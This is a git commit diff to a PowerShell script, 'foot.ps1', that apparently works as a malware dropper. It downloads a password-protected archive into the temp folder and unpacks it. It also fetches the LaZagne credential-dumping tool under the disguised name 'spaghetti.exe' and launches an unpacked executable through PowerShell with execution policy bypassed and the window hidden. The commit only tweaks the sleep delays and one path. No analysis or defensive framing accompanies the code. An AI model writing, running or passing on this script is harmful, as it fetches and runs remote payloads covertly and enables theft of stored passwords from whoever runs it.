b1302d74b5a722afc8d4121bf9b0e113ab7e40f8
bakgatviooldoos <56836858+bakgatviooldoos@users.noreply.github.com>
2023-07-25 11:31:46 +0200

    Update foot.ps1

--- foot.ps1
+++ foot.ps1
@@ -7,16 +7,16 @@ $downloadUrl = "https://github.com/bakgatviooldoos/bascillaneous/raw/main/archiv
 $zipFilePath = "$env:TEMP\archive.zip"
 Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
 
+Start-Sleep 10
+
 # Unpack the password-protected ZIP archive
 $extractedFolderPath = "$env:TEMP\HOME"
 $arguments = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p$Password"
 Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -Wait
 
-Start-Sleep -Seconds 100
-
 Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$extractedFolderPath\spaghetti.exe"
 
-$executablePath = "$env:TEMP\HOME\self.exe"
+$executablePath = "$extractedFolderPath\self.exe"
 
 # Execute the unpacked file
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$executablePath`"" -WindowStyle Hidden
